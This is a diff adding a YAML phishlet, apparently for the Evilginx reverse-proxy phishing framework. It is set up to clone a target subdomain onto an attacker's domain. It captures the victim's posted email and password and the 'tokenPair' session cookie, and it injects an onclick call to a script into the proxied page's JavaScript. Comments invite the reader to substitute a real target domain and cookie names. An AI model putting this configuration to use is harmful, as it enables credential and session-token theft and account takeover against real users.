@@ -1,0 +1,31 @@
+min_ver: '3.0.0'
+# example for cloning test.target.com to test.mydomain.com
+# replace target.com with your target domain name and "test" with your target subdomain name 
+
+
+proxy_hosts:
+  - {phish_sub: 'test', orig_sub: 'test', domain: 'target.com', session: true, is_landing: true, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'target.com', orig_sub: 'test', domain: 'target.com', search: 'mydomain.com', replace: 'target.com', mimes: ['text/html']}
+  - {triggers_on: 'target.com', orig_sub: 'test', domain: 'target.com', search: 'mydomain.com', replace: 'target.com', mimes: ['application/javascript']}
+  - {triggers_on: 'target.com' , orig_sub: 'test', domain: 'target.com', search: 'tabindex="0"', replace: 'tabindex="0" onclick="OurScript()"', mimes: ['application/javascript']}
+
+auth_tokens:
+  - domain: 'test.target.com'
+    keys: ['tokenPair'] # add cookie names here 
+
+## replace this section according to your needs 
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'test.target.com'
+  path: '/'
